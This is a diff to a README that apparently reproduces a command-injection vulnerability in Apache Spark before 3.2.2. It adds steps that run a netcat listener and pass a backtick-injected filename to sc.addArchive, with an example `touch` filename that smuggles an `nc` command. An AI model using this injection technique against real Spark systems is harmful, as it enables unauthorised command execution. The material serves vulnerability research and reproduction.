@@ -16,20 +16,34 @@ Spark < 3.2.2
 Start the container
 
 ```bash
-docker-compse up
+docker-compse run spark
 ```
 
-attach to the shell of container and run `spark-shell`, input
+it will open a `spark-shell`,
+
+open another shell by attach to the container with `root` and run 
 
 ```bash
-sc.addArchive("/`touch poc.txt`&&poc.tar")
+nc -lvvp 9000
+```
+
+input the following content to `spark-shell`
+
+```bash
+sc.addArchive("/opt/`nc -z -w 2 localhost 9000`&&poc.tar")
 ```
 
 Or you can create yourself archive file and copy it to container with
 
 ```
-touch \`{command(need escapation)}\`\&\&data.tar
+touch \`{command(need escapation)}\`\&\&poc.tar
+# exmaple
+# touch \`nc\ \-z\ \-w\ 2\ localhost\ 9000\`\&\&poc.tar
 ```
+
+and you will found the command has been exeuted.
+
+![poc_docker](images/poc_docker.png)
 
 A local screenshot of poc.
 
